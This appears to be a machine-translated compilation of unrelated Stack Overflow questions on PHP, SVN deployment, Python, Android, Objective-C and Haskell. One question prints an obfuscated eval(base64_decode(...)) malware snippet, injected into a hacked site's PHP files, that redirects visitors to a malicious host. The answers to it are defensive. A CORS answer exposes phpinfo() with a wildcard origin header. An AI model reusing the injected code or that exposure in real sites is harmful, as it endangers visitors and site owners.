推出代码的最佳方法是什么？服务器之间的同步？SFTP？从远程服务器调用 SVN 导出？我正在考虑在每个存储库上执行一个提交后操作/事件来启动它。多平台解决方案将是关键。

**编辑 #1** 刚刚了解到 svn export 不会同步，它会在远程服务器上保留已删除的文件完好无损...

**编辑#2**

*   我必须考虑到要推送（或拉取）到这些服务器的许多存储库。
*   这些涉及 PHP 或 ASP.Net 项目（站点/应用程序）

**解决方案**

*   在其他服务器上安装 Hudson
*   将源代码签出到我们网络服务器上的特定位置
*   为将目录更改为工作副本并调用 svn up 的特定项目创建作业
*   在作业 URL 上执行 wget 的提交后挂钩 - hudson/job/name_of_job/build?delay=0sec

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T19:32:41.583

在每个远程系统上调用的提交后挂钩，`svn update`在每个系统上都有一个工作副本，是您可以走的一条路线（并且很常见，可以作为[常见问题解答条目](http://subversion.apache.org/faq.html#website-auto-update)）。

您可能还想研究一个持续集成服务器，特别是如果您需要推出的项目是必须编译和部署的应用程序（Tomcat 可能就是这种情况）。在这种情况下，您的 CI 服务器将轮询检查更改并拉取更新，而不是从 Subversion 服务器推送，然后运行您的编译/测试/部署脚本并报告结果。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-25T17:31:27.480

[svn同步](http://svnbook.red-bean.com/en/1.7/svn.reposadmin.maint.html#svn.reposadmin.maint.tk.svnsync)。

它工作得很好，只是要小心把它放在 post-commit 和 post-revprop-change 钩子中，因为它会在大多数提交中被调用两次。您还需要使远程服务器对除 svnsync 用户之外的所有人都是只读的。

您还可以将这些存储库设置为只读，但自动将编写器推回主存储库，因此远程可以用作缓存。Svnsync 也非常适合进行连续备份。

红皮书的[存储库复制](http://svnbook.red-bean.com/en/1.7/svn.reposadmin.maint.html#svn.reposadmin.maint.replication)部分说明了您需要知道的所有内容。

# php - 根据语言打开页面

> ID：12587154
> 
> 赞同：0
> 
> 时间：2012-09-25T16:25:17.183
> 
> 标签：php, jquery, html

当我输入英文版时，如何将“textos legales”更改为例如“法律文本”，以便可以将 a href 更改为新的英文“法律文本”？

这是我用于西班牙语版本的内容：

```
<li class="legal"><a href="/textos-legales">Textos legales</a></li> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:32:11.597

一种取决于用户浏览器首选语言的方法：

[http://php.net/manual/en/function.http-negotiate-language.php](http://php.net/manual/en/function.http-negotiate-language.php)

```
$languages = array(
        'en',// default
        'es',
);
$result = array();
$locale = http_negotiate_language($languages, $result);..

if($locale=="es"){
    echo "<li class='legal'><a href='/textos-legales'>Textos legales</a></li>";
}else{
    echo "<li class='legal'><a href='/legal'>legal text</a></li>";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:35:16.073

可以获取 URI，如果 URI == en 回显英文文本

```
$page=$_SERVER['REQUEST_URI'];
if ($page == '/en'){
 echo 'Legal text';
}else if($page == '/es'){
 echo 'Textos legales';
}..... 
```

# php - Yii CAdvancedArBehavior 无法在加载后立即保存具有关系的模型

> ID：12587155
> 
> 赞同：2
> 
> 时间：2012-09-25T16:25:18.730
> 
> 标签：php, mysql, yii, many-to-many

我有2个模型：

`Mail`有关系的类：

```
'relAttachments' => array(self::MANY_MANY, 'File', 'rel_mail_file(rel_mail, rel_file)'), 
```

`Mail`附加了[AdvancedArBehavior](http://www.yiiframework.com/extension/cadvancedarbehavior/)扩展，因此我可以使用 1-liner 将附件链接到它，我喜欢这样：

```
$mail->relAttachments = $attachments; // $attachments is an array of ids for `File` models 
```

`Mailque`有关系的类：

```
'relMail' => array(self::BELONGS_TO, 'Mail', 'rel_mail'), 
```

保存并链接 Mail 和 Mailque 后，我在发送邮件后运行此代码：

```
$mail = Mail::model()->findByPk($id);
$mailModel = $mail->relMail;

var_dump(count($mailModel->relAttachments));  // outputs 1

$mailModel->sent = time();
$mailModel->save();
//$mail->delete(); 
```

调用 save() 会产生以下错误：

```
exception 'CException' with message 'Property "File.rel_file" is not defined.' in ...\framework\base\CComponent.php:131 
```

有谁知道这里发生了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T06:19:15.127

看起来您需要在文件模型中定义一个公共变量。

试试这个......在文件类

```
public $rel_file = 'id'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-17T03:40:54.290

或者你可以从源头杀死它:)

在 /protected/extensions/CAdvancedArBehavior.php

注释掉第 165 行并将其替换如下：

```
// $foreignobject = $foreignobject->{$foreignobject->$relation['m2mForeignField']};
$foreignobject = $foreignobject->getPrimaryKey(); 
```

我在 Yii 论坛上得到了这个补丁，它解决了我的问题，而不需要 SuReVa 的破解。我通过保存和加载一些 m2m 模型关系进行了一些测试，看起来还不错，尽管我没有对其进行广泛测试。

# php - `return $this->foo() === null` 是什么意思？

> ID：12587156
> 
> 赞同：0
> 
> 时间：2012-09-25T16:25:20.810
> 
> 标签：php, class, function, return

这是一个代码示例：

```
class md {
public function __construct() {
    if($this->getIsGuest()){
        echo 'iam guest';
    }
}
public function getIsGuest() {
    return $this->getState('__id')===null;
}
public function getState($val) {
    return '3';
} 
```

是 return $this->foo() === null 是 foo 的默认值，什么都不返回？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:27:15.047

`getIsGuest()`正在返回 $this->getState('__id') 与 null 的比较。

如果`$this->getState('__id')`准确返回`null`，则`getIsGuest()`函数返回 true。如果它返回任何东西`null`，但该`getIsGuest()`函数返回 false。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:56:42.557

这不是一个很好的示例，但它没有任何默认值。您*可以确定*的是，该`getIsGuest`方法将*始终*返回一个布尔值（`true`或`false`）。在您的代码片段中，它将始终返回 false，因为它使用另一个方法 ( `getState`) 的返回值并将其与`null`严格的 (值*和*类型) 进行比较。由于`getState`成员函数在您的示例中被硬编码为返回一个字符，因此它*永远不会*返回 null，因此`getIsGuest`将*始终*返回 false。

PHP 将`null`所有没有显式 return 语句的函数或方法作为其默认返回值（构造函数可能例外，它返回一个对象的实例）。就像 JS`undefined`默认会返回一样（构造函数除外），或者 C 函数可以返回`void`，但那是另一回事。
简而言之：不，您的代码没有设置默认返回值。我将尝试通过稍微编辑您的代码段来澄清所有这些：

```
class md
{
    private $_mdData = array();//no data
    public function __construct(array $params = null)//default value of $params is null
    {//the constructor expects either no parameters, or an array
        if ($params !== null)
        {
            $this->_mdData = $params;
        }
        if($this->getIsGuest())
        {
            echo 'I\'m guest';
        }
    }

    public function getIsGuest()
    {
        return $this->getState('__id') === null;
    }

    public function getState($val)
    {//return whatever value is stored in the private array under $val-key
     //if the key doesn't exist, null is returned
        return (isset($this->_mdData[$val]) ? $this->_mdData[$val] : null);
    }
}

$guest = new md();//no params 
```

构造函数调用getIsGuest，它试图访问$ *mdData['_id* ']
$_mdData 为空，所以key 不存在，返回null 给getIsGuest。
getIsGuest 将返回值 (null) 与 null 进行比较，并返回 true（因为它们相同）
构造​​函数接收 true，因为那`getIsGuest`是调用方法的地方，并评估值`if ($this->getIsGuest())`--> true，因此`I'm a guest`被回显。

```
$nonGuest = new md(array('__id'=>123));//same drill, only this time getState will return 123, and getIsGuest returns false 
```

`==`现在和之间的区别`===`：

```
$nullish = new md(array('__id' => '')); 
```

这*不会*回显我是客人，*除非*您要更改`return $this->getState('__id') === null;`为，`return $this->getState('__id') == null;`因为`''`空字符串是空字符串，例如`0`虚假等...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:29:45.127

=== 是 php 中的类型相等。在这种情况下，它将用于区分 0、''、false 或实际值 null。

# php - 恶意代码：eval(base64_decode(

> ID：12587159
> 
> 赞同：1
> 
> 时间：2012-09-25T16:25:27.920
> 
> 标签：php, hosting, eval

最近我注意到一个 jquery mobile - 创建的 php 网站没有加载。当我检查相关的 php 文件时，我可以看到一些额外的字符进入了代码中。标记后不久，多余的字符就出现了`<?php`。原因是什么？我的网站被黑了吗？我将如何恢复我的所有文件？这些文件正在通过控制面板登录访问。我什至可以看到网站文件夹之外的文件，一些 wp 文件（wp-config.php、wp-blog-header.php 等）也包含这些额外的字符。

这是发现的恶意代码 -`<?php eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVI`

有大佬，求指教。

这是完整的代码

评估（base64_decode（“/KVwmbHJcPS8iLCryZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcGtqbGFwb2suMWR1bWIuY29tLyIpOw0KZXhpdCgpOw0KfQp9Cn0NCn0NCn0="));

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:39:09.600

回答直接问题：是的，您的网站已被黑客入侵。

旨在掩饰正在执行的`eval(base64_decode(....))`代码的性质，但它不能掩饰您的 PHP 文件中有不属于那里的代码的事实。

至于被黑代码的作用，我无法回答，因为你没有提供所有这些。

我也无法回答关于他们是*如何*进入的任何问题，但很可能是在您的系统（或您的网络托管公司的系统）中的某个地方存在一个具有已知安全漏洞的软件包。

在大多数情况下，该软件的供应商已经修复了这个漏洞，但被黑网站上的版本不会使用最新的修复程序进行更新，从而使黑客有机会进入。

还有其他方法可以闯入站点，但这是迄今为止最有可能的方法。

我无法告诉您使用了哪些软件来入侵您的网站。涉及的变量太多，我对此了解的不够多。我可以建议您确保您负责的所有软件都是安全的并运行最新版本，并与您的托管公司核实以确保它们也完全是最新的。

您没有按名称提及 Wordpress，但您指定的文件听起来像是属于 Wordpress。因此，恢复文件应该只是将它们更新回原始 Wordpress 版本的情况。但是，正如我所说，您应该确保更新到最新的 WP 版本，因为听起来您拥有的版本已经过时且易受攻击。

您页面中的实际数据可能已被泄露，但所描述的黑客行为的性质，听起来更像是 PHP 注入黑客，所以我希望如果您将 WP 文件恢复到原始状态，您的页面将被恢复. 但是，您应该彻底检查，以确保没有任何意想不到的东西仍然潜伏在那里。

**[编辑]** 现在我们有了完整的代码，很容易看到它在做什么：将代码复制到一个小的 PHP 程序中，并替换`eval`为`print`，这样您就可以看到正在运行，而不是实际运行它。答案是它会检查用户不是 googlebot 或类似用户，如果不是，它会将页面重定向到恶意 URL。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:31:29.320

这是 WordPress 和其他旧 CMS 的旧安装的常见问题，尤其是那些使用旧版本`timthumb`动态处理图像的问题。

有人将该代码注入到您的大多数 .PHP 文件的顶部（至少是那些以空行开头的文件`<?php`）。这发生在我几个月前。

eval() 代码基本上是“加密”恶意 PHP 代码并`eval`在 PHP 文件打开时运行它（使用它）。如果没有看到完整的 base64 字符串（并对其进行解码），就不可能确定代码的作用，但如果它与发生在我身上的注入类似，它会将一些 JavaScript 代码附加到您的站点以将访问者重定向到恶意页面，或者以其他方式改变您网站内的链接行为。

您需要找到导致此问题的漏洞，然后将其关闭。如果它是 WordPress 的过时版本，请升级。检查您的访问日志以查找可疑的 POST 查询。

我知道解决这个问题的唯一方法是从盒子上的每个 PHP 文件中删除 PHP 代码。如果每个文件中的代码相同，则可以使用 Linux bash 命令和高级文本编辑器从多个文件中删除代码。如果没有，拿起文件、记事本和一大杯咖啡:)

# php - AJAX CORS 调用不适用于 PHP

> ID：12587164
> 
> 赞同：0
> 
> 时间：2012-09-25T16:25:38.513
> 
> 标签：php, ajax, cors

我正在尝试从一个简单的 java 脚本函数调用我们的 API 服务器。下面是我使用的代码：

```
function jack() {
            //fullURL defined here
    debugger;
    var xhr = new XMLHttpRequest();
    var onLoadHandler = function(event) {
      /* do something with the response */
          debugger;
    }
    var onErrorHandler = function(event) {
          /* do something with the response */
              debugger;
        }
    xhr.open('GET',fullURL);
    xhr.onload = onLoadHandler;
    xhr.onerror = onErrorHandler;
    xhr.send();
} 
```

我无法加载完整的完整 URL，因为页面说：“您的帖子包含无效的外部”，所以我可以确认它以 http 开头并转到 /api/phpInfo.php

我打开浏览器访问该页面并启动 Firebug。在 Firebug 控制台中，我调用 jack() 并以 var onErrorHandler = function(event) 结束。Firebug 告诉我事件是“错误”，但我需要知道什么错误？如果我转到我的 PHP 服务器，我可以在日志中看到调用已完成并返回了服务器 200 代码？Firebug 还显示“HTML”选项卡返回空白，但对 fullURL 的调用确实将信息页面返回给我（在浏览器中）

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T18:49:35.120

这对我有用！！！Javascript：

> var httpReq = getXMLHTTPRequest();
> 
> 函数 makeCall() { var myurl = "http://111.111.111.111:11111/api/phpInfo.php"; myRand = parseInt(Math.random()*999999999999999); var modurl = myurl+"?rand="+myRand; httpReq.open("GET", modurl, true); httpReq.onreadystatechange = useHttpResponse899; httpReq.send(); }
> 
> function useHttpResponse899() { if (httpReq.readyState == 4) { if(httpReq.status == 200) { // 在这里用获得的值/响应做所有的处理 } } }

在 phpInfo 的 PHP 服务器上，我有：

```
<?php 
header('Access-Control-Allow-Origin: *');
phpinfo();  
?> 
```

# python - 如何使用GDAL python从LiDAR点（X，Y，Z）创建网格？

> ID：12587171
> 
> 赞同：2
> 
> 时间：2012-09-25T16:25:57.097
> 
> 标签：python, grid, gdal, osgeo, lidar

我是 python 编程的新手，我只是想知道您是否可以使用 LiDAR 点创建分辨率为 0.5 x o.5 m 的常规网格。

我的数据采用 LAS 格式（从 liblas 导入文件读取为 lasfile），它们具有以下格式：X、Y、Z。其中 X 和 Y 是坐标。

这些点是随机定位的，一些像素是空的（NAN 值），并且在一些像素中有多个点。如果有多个点，我希望获得一个平均值。最后，我需要将数据保存为 TIF 格式或 Ascii 格式。

我正在研究 osgeo 模块和 GDAL，但老实说，我不知道 osgeo 模块是否是最好的解决方案。

我很高兴能得到一些我可以学习和实现的代码的帮助，

**提前感谢您的帮助，我真的需要**。

我不知道使用这些参数获取网格的最佳方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-18T22:56:44.737

有点晚了，但也许这个答案对其他人有用，如果不是对你...

我已经用 Numpy 和 Pandas 做到了这一点，而且速度非常快。我正在使用 TLS 数据，并且可以在一台像样的 2009 年老式笔记本电脑上使用数百万个数据点毫无问题地做到这一点。关键是通过对数据进行四舍五入“分箱”，然后使用 Pandas 的 GroupBy 方法进行聚合并计算均值。

如果你需要四舍五入到 10 的幂，你可以使用 np.round，否则你可以通过创建一个函数来四舍五入到任意值，我通过修改[这个 SO answer](https://stackoverflow.com/questions/7859147/round-in-numpy-to-nearest-step)来完成。

```
import numpy as np
import pandas as pd

# make rounding function:
def round_to_val(a, round_val):
    return np.round( np.array(a, dtype=float) / round_val) * round_val

# load data
data = np.load( 'shape of ndata, 3')
n_d = data.shape[0]

# round the data
d_round = np.empty( [n_d, 5] )
d_round[:,0] = data[:,0]
d_round[:,1] = data[:,1]
d_round[:,2] = data[:,2]

del data  # free up some RAM

d_round[:,3] = round_to_val( d_round[:,0], 0.5)
d_round[:,4] = round_to_val( d_round[:,1], 0.5)

# sorting data
ind = np.lexsort( (d_round[:,4], d_round[:,3]) )
d_sort = d_round[ind]

# making dataframes and grouping stuff
df_cols = ['x', 'y', 'z', 'x_round', 'y_round']
df = pd.DataFrame( d_sort)
df.columns = df_cols
df_round = df[['x_round', 'y_round', 'z']]
group_xy = df_round.groupby(['x_round', 'y_round'])

# calculating the mean, write to csv, which saves the file with:
# [x_round, y_round, z_mean] columns.  You can exit Python and then start up 
# later to clear memory if that's an issue.
group_mean = group_xy.mean()
group_mean.to_csv('your_binned_data.csv')

# Restarting...
import numpy as np
from scipy.interpolate import griddata

binned_data = np.loadtxt('your_binned_data.csv', skiprows=1, delimiter=',')
x_bins = binned_data[:,0]
y_bins = binned_data[:,1]
z_vals = binned_data[:,2]

pts = np.array( [x_bins, y_bins])
pts = pts.T

# make grid (with borders rounded to 0.5...)
xmax, xmin = 640000.5, 637000
ymax, ymin = 6070000.5, 6067000

grid_x, grid_y = np.mgrid[640000.5:637000:0.5, 6067000.5:6070000:0.5]

# interpolate onto grid
data_grid = griddata(pts, z_vals, (grid_x, grid_y), method='cubic')

# save to ascii
np.savetxt('data_grid.txt', data_grid) 
```

完成此操作后，我将输出保存为 .npy 并使用 Image 库转换为 tiff，然后在 ArcMap 中进行地理配准。osgeo 可能有一种方法可以做到这一点，但我没有使用它。

希望这至少可以帮助某人...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T18:06:36.383

您可以使用 Numpy 中的 histogram 函数进行分箱，例如：

```
import numpy as np
points = np.random.random(1000)
#create 10 bins from 0 to 1
bins = np.linspace(0, 1, 10)
means = (numpy.histogram(points, bins, weights=data)[0] /
             numpy.histogram(points, bins)[0]) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T20:59:38.537

试试[LAStools](http://www.cs.unc.edu/~isenburg/lastools/)，尤其是[lasgrid](http://www.cs.unc.edu/~isenburg/lastools/download/lasgrid_README.txt)或[las2dem](http://www.cs.unc.edu/~isenburg/lastools/download/las2dem_README.txt)。

# android - 在 Android 中，如何在运行时找出手机正在运行的 ROM 和内核？

> ID：12587177
> 
> 赞同：2
> 
> 时间：2012-09-25T16:26:03.623
> 
> 标签：android, kernel, rom

基本上，我知道在基于 CM10 的 ROM 上运行的特定内核对我的应用程序有问题，我想在运行时检测到该问题，并向用户发送更改内核的警报。如何从我的应用程序中找出内核和 ROM？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:32:28.310

[http://developer.android.com/reference/android/os/Build.html](http://developer.android.com/reference/android/os/Build.html)

[编辑]

如果 Build 不能满足您的需求，请尝试 System.getProperty("os.version")。我已经在 3 台设备上进行了测试，它提供了内核字符串。你应该能够得到 Build 没有给你的任何东西。

[http://developer.android.com/reference/java/lang/System.html#getProperties()](http://developer.android.com/reference/java/lang/System.html#getProperties%28%29)

# objective-c - 从线程异步更新 NSView

> ID：12587186
> 
> 赞同：0
> 
> 时间：2012-09-25T16:26:42.203
> 
> 标签：objective-c, macos, nsview, quartz-2d, agent-based-modeling

首先，我是一名 Objective-C 新手。所以我对 OS X 或 iOS 开发不是很熟悉。我的经验主要是在 Java 中。

我正在创建一个基于代理的建模框架。我想显示模拟并为此编写一个小应用程序。首先，关于框架。该框架有一个`World`类，其中有一个`start`方法，该方法遍历所有代理并让它们执行其任务。在世界的一个“步骤”结束时（即，在所有代理都完成了他们的事情之后），该`start`方法调用`intercept`实现的对象的方法`InterceptorProtocol`。该对象之前是通过构造函数传入的。使用拦截器，任何人都可以了解世界的状态。这对于日志记录很有用，或者在我试图完成的场景中：以图形方式显示信息。调用`intercept`是同步的。

现在就 GUI 应用程序而言，它非常简单。我有一个初始化自定义视图的控制器。这个自定义视图还实现`InterceptorProtocol`了它可以监听世界上发生的事情。我创建一个`World`对象并将视图作为拦截器传递。视图通过私有属性维护对世界的引用，因此一旦我初始化了世界，我将视图的世界属性设置为我刚刚创建的世界（我意识到这会创建一个循环，但我需要对视图方法中的世界，`drawRect`我能拥有它的唯一方法是如果我从类中保持对它的引用）。

由于世界的`start`方法是同步的，我不会立即启动世界。在`drawRect`方法中，我检查世界是否正在运行。如果不是，我在后台线程中启动它。如果是，我会检查这个世界并显示我需要的所有图形。

在方法中（从后台线程上运行`intercept`调用），我设置为. 由于世界的方法在一个单独的线程中运行，所以我还有一个用于同步的锁定对象，这样我就不会在它被变异时处理该对象（这部分有点笨拙，它可能不工作我期望它的方式 - 有不止几个粗糙的地方，我只是想努力工作；我计划稍后清理）。`start``setNeedsToDisplay``YES``start``World`

我的问题是视图渲染了一些东西，然后它几乎被锁定了。我可以看到`NSLog`正在调用语句，因此代码正在运行，但视图上没有任何更新。

这是一些相关的代码：

**主视图控制器**

```
#import "MasterViewController.h"
#import "World.h"
#import "InfectableBug.h"

@interface MasterViewController ()

@end

@implementation MasterViewController

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        _worldView = [[WorldView alloc] init];

        World* world = [[World alloc] initWithName: @"Bhumi"
                                              rows: 100
                                           columns: 100
                                        iterations: 2000
                                  snapshotInterval: 1
                                       interceptor: _worldView];
        for(int i = 0; i < 999; i++) {
            NSMutableString* name = [NSMutableString stringWithString: @"HealthyBug"];
            [name appendString: [[NSNumber numberWithInt: i] stringValue]];
            [world addBug: [[InfectableBug alloc] initWithWorld: world
                                                           name: name
                                                          layer: @"FirstLayer"
                                                       infected: NO
                                                infectionRadius: 1
                                               incubationPeriod: 10
                                        infectionStartIteration: 0]];
        }

        NSLog(@"Added all bugs. Going to add infected");

        [world addBug: [[InfectableBug alloc] initWithWorld: world
                                                       name: @"InfectedBug"
                                                      layer: @"FirstLayer"
                                                   infected: YES
                                            infectionRadius: 1
                                           incubationPeriod: 10
                                    infectionStartIteration: 0]];

        [_worldView setWorld: world];

        //[world start];
    }

    return self;
}

- (NSView*) view {
    return self.worldView;
}

@end 
```

**世界观**

```
#import "WorldView.h"
#import "World.h"
#import "InfectableBug.h"

@implementation WorldView

@synthesize world;

- (id) initWithFrame:(NSRect) frame {
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code here.
    }

    return self;
}

- (void) drawRect:(NSRect) dirtyRect {

    CGContextRef myContext = [[NSGraphicsContext currentContext] graphicsPort];
    CGContextClearRect(myContext, CGRectMake(0, 0, 1024, 768));

    NSUInteger rows = [world rows];
    NSUInteger columns = [world columns];

    NSUInteger cellWidth = 1024 / columns;
    NSUInteger cellHeight = 768 / rows;

    if([world running]) {
        @synchronized (_lock) {
            //Ideally we would need layers, but for now let's just get this to display
            NSArray* bugs = [world bugs];
            NSEnumerator* enumerator = [bugs objectEnumerator];
            InfectableBug* bug;
            while ((bug = [enumerator nextObject])) {
                if([bug infected] == YES) {
                    CGContextSetRGBFillColor(myContext, 128, 0, 0, 1);
                } else {
                    CGContextSetRGBFillColor(myContext, 0, 0, 128, 1);
                }

                NSLog(@"Drawing bug %@ at %lu, %lu with width %lu and height %lu", [bug name], [bug x] * cellWidth, [bug y] * cellHeight, cellWidth, cellHeight);

                CGContextFillRect(myContext, CGRectMake([bug x] * cellWidth, [bug y] * cellHeight, cellWidth, cellHeight));
            }
        }
    } else {
        [world performSelectorInBackground: @selector(start) withObject: nil];
    }
}

- (BOOL) isFlipped {
    return YES;
}

- (void) intercept: (World *) aWorld {

    struct timespec time;
    time.tv_sec  = 0;
    time.tv_nsec = 500000000L;

    //nanosleep(&time, NULL);

    @synchronized (_lock) {
        [self setNeedsDisplay: YES];
    }
}

@end 
```

****World.m中的****启动**方法：**

 **```
- (void) start {

    running = YES;

    while(currentIteration < iterations) {

        @autoreleasepool {

            [bugs shuffle];

            NSEnumerator* bugEnumerator = [bugs objectEnumerator];
            Bug* bug;

            while((bug = [bugEnumerator nextObject])) {

                NSString* originalLayer = [bug layer];
                NSUInteger originalX = [bug x];
                NSUInteger originalY = [bug y];

                //NSLog(@"Bug %@ is going to act and location %i:%i is %@", [bug name], [bug x], [bug y], [self isOccupied: [bug layer] x: [bug x] y: [bug y]] ? @"occupied" : @"not occupied");
                [bug act];
                //NSLog(@"Bug has acted");

                if(![originalLayer isEqualToString: [bug layer]] || originalX != [bug x] || originalY != [bug y]) {
                    //NSLog(@"Bug has moved");
                    [self moveBugFrom: originalLayer atX: originalX atY: originalY toLayer: [bug layer] atX: [bug x] atY: [bug y]];
                    //NSLog(@"Updated bug position");
                }
            }

            if(currentIteration % snapshotInterval == 0) {
                [interceptor intercept: self];
            }

            currentIteration++;
        }
    }

    //NSLog(@"Done.");
} 
```

如果您想查看任何其他代码，请告诉我。我意识到代码并不漂亮。我只是想让东西正常工作，我计划稍后清理它。另外，如果我违反了 Objective-C 最佳实践，请告诉我！

*走出去一点；抱歉，如果我没有立即回复！*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:09:43.780

唷，安静的问题可能是一个简单的答案：;）

**UI 更新必须在主线程上执行**

如果我正确阅读了您的代码，您将`start`在后台线程上调用该方法。start 方法包含类似的东西`moveBugFrom:...`以及`intercept:`方法。因此，intercept 方法调用`setNeedsDisplay:`后台线程。

让所有与 UI 相关的东西在主线程上执行。最好的选择是使用 Grand Central Dispatch，除非您需要支持 iOS < 4 或 OS X < 10.6（或者是 10.7？），如下所示：

```
dispatch_async(dispatch_get_main_queue(), ^{
    // perform UI updates
}); 
```**

# haskell - Haskell 应用变压器的例子

> ID：12587195
> 
> 赞同：11
> 
> 时间：2012-09-25T16:27:06.343
> 
> 标签：haskell, monad-transformers, applicative

www.haskell.org 上的 wiki 告诉我们以下有关 Applicative Transformers 的信息：

> 那么应用变压器在哪里呢？答案是，我们不需要针对应用函子的特殊转换器，因为它们可以以通用方式组合。 [http://www.haskell.org/haskellwiki/Applicative_functor#Applicative_transfomers](http://www.haskell.org/haskellwiki/Applicative_functor#Applicative_transfomers)

我尝试了以下方法来尝试组合一堆应用函子。但我得到的只是一堆错误。这是代码：

```
import Control.Applicative
import System.IO

ex x y = (:) <$> x <*> y 
test1 = ex "abc" ["pqr", "xyz"]  -- only this works correctly as expected
test2 = ex "abc" [Just "pqr", Just "xyz"]
test3 = ex "abc" (Just "pqr")
test4 = ex (Just 'a') ["pqr", "xyz"]
test5 = ex (return ("abc"):: IO ()) [Just "pqr", Just "xyz"] 
```

这会产生很多类型错误，虽然我可以部分理解，但我根本无法解决它们。

错误在最后给出。

那么，例如，我如何结合 Maybe Applicative 和 List Applicative 呢？

例如，如何将 State Applicative 和 List Applicative 结合起来？还有其他例子吗，比如说，结合了 Maybe 和 List，Maybe 和 State，最后是可怕的 IO 和 State 应用程序？

谢谢。

GHCi 错误消息如下。

```
example.hs:6:19:
    Couldn't match expected type `[Char]' with actual type `Maybe a0'
    In the return type of a call of `Just'
    In the expression: Just "pqr"
    In the second argument of `ex', namely `[Just "pqr", Just "xyz"]'

example.hs:7:19:
    Couldn't match expected type `[[Char]]' with actual type `Maybe a0'
    In the return type of a call of `Just'
    In the second argument of `ex', namely `(Just "pqr")'
    In the expression: ex "abc" (Just "pqr")

example.hs:8:23:
    Couldn't match expected type `Maybe' with actual type `[]'
    In the second argument of `ex', namely `["pqr", "xyz"]'
    In the expression: ex (Just 'a') ["pqr", "xyz"]
    In an equation for `test4': test4 = ex (Just 'a') ["pqr", "xyz"]

example.hs:9:21:
    Couldn't match expected type `()' with actual type `[Char]'
    In the first argument of `return', namely `("abc")'
    In the first argument of `ex', namely `(return ("abc") :: IO ())'
    In the expression:
      ex (return ("abc") :: IO ()) [Just "pqr", Just "xyz"]
Failed, modules loaded: none.
Prelude> 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-25T17:29:54.263

考虑以下类型签名：

```
liftA2 :: (Applicative f) => (a -> b -> c) -> f a -> f b -> f c
(<*>) :: (Applicative f) => f (a -> b) -> f a -> f b 
```

结合起来，得到的类型是：

```
liftA2 (<*>) :: (Applicative f, Applicative g) 
             => f (g (a -> b)) -> f (g a) -> f (g b) 
```

这确实是两个`Applicative`s的组合。事实上，它*恰好是*两个`Applicative`s 的组合。换句话说，尽管您*可以*以通用方式组合`Applicative`s，但这绝不是*自动*完成的。一切都必须明确提升正确的次数。

您的`ex`功能等效于`liftA2 (:)`，其类型为`(Applicative f) => f a -> f [a] -> f [a]`。通过您的示例，对您想要做的事情进行一些猜测：

```
test1 = ex "abc" ["pqr", "xyz"] 
```

这`f`是`[]`，我们将其应用于类型`[Char]`和的参数`[[Char]]`。

```
test2 = ex "abc" [Just "pqr", Just "xyz"] 
```

第二个参数是 type `[Maybe [Char]]`，所以我们需要提升两次。第一个参数也需要解除，因为它有类型`[Char]`并且应该是`[Maybe Char]`。

```
test3 = ex "abc" (Just "pqr") 
```

这次第二个参数是 type ，`Maybe [Char]`所以我们只需要一次电梯。因此，第一个参数应该是 type 。`f``Maybe``Maybe Char`

```
test4 = ex (Just 'a') ["pqr", "xyz"] 
```

这次第一个参数是`Maybe Char`但第二个是`[[Char]]`，所以你有两个完全不同`Applicative`的s；两者都需要被解除，给你一个`[Maybe Char]`或`Maybe [Char]`。

```
test5 = ex (return ("abc"):: IO ()) [Just "pqr", Just "xyz"] 
```

这里的类型签名没有意义；你可能想要`IO [Char]`。第二个参数有 type `[Maybe [Char]]`。和前面的例子一样，它们不匹配，但这次你有*3 个* `Applicative`s。如果你想要类似的东西`IO [Maybe a]`，你需要举起`(:)`所有 3 次，例如`liftA2 (liftA2 ex)`。

这种组合`Applicative`s 的方式称为“函子组合”，您链接到的页面提到了定义显式组合类型构造函数的库。例如，[使用`transformers`library](http://hackage.haskell.org/packages/archive/transformers/0.3.0.0/doc/html/Data-Functor-Compose.html)，您可以有一个类型`Compose IO (Compose [] Maybe)`来描述您的第五个示例。`Applicative`这种组合类型以上述通用方式定义为实例，并应用正确数量的提升操作。缺点是您需要包装和打开所需的`newtype`图层。

* * *

作为附录，此声明：

> 那么应用变压器在哪里呢？答案是，我们不需要针对应用函子的特殊转换器，因为它们可以以通用方式组合。

